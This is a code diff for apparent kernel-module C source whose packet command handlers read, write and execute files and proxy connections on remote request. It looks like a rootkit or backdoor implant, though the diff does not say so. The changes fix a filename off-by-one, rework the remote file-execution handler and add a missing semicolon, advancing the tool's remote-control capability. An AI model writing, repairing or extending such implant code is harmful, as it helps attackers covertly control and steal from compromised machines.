@@ -25,7 +25,7 @@ int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_b
     if (IS_ERR(filename))
         return PTR_ERR(filename);
 
-    memcpy(filename, packet->content, filename_len);
+    memcpy(filename, packet->content, filename_len - 1);
     filename[filename_len - 1] = '\x00'; // add nullbyte
 
     retv = file_read(filename, res_buf, res_buflen);
@@ -48,7 +48,7 @@ int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_
     if (IS_ERR(filename))
         return PTR_ERR(filename);
 
-    memcpy(filename, packet->content, filename_len);
+    memcpy(filename, packet->content, filename_len - 1);
     filename[filename_len - 1] = '\x00'; // add nullbyte
 
     // when filename_len == packet->content_len+1, i.e. content doesn't include nb
@@ -65,16 +65,24 @@ int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_
 
 int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
-    char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-    char* argv[] = {NULL, NULL};
+    size_t filename_len;
+    char *filename;
+    int retv;
 
-    // quick 'n dirty way to circumvent const
-    u8* content_mod = kzmalloc(packet->content_len, GFP_KERNEL);
-    memcpy(content_mod, packet->content, packet->content_len);
+    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
+    filename_len = packet->content_len + 1;
+    filename = kzmalloc(filename_len, GFP_KERNEL);
+    if (IS_ERR(filename))
+        return PTR_ERR(filename);
 
-    argv[0] = content_mod;
+    memcpy(filename, packet->content, filename_len - 1);
+    filename[filename_len - 1] = '\x00'; // add nullbyte
 
-    return file_exec(argv[0], argv, envp);
+    retv = file_exec(filename, res_buf, res_buflen);
+    
+    kzfree(filename, filename_len);
+    
+    return retv;
 }
 
 int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
@@ -85,7 +93,7 @@ int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_bufle
 
     if (packet->content_len < 6)
     {
-        retv = -EMSGSIZE
+        retv = -EMSGSIZE;
         goto LAB_OUT_NO_SOCK;
     }
 
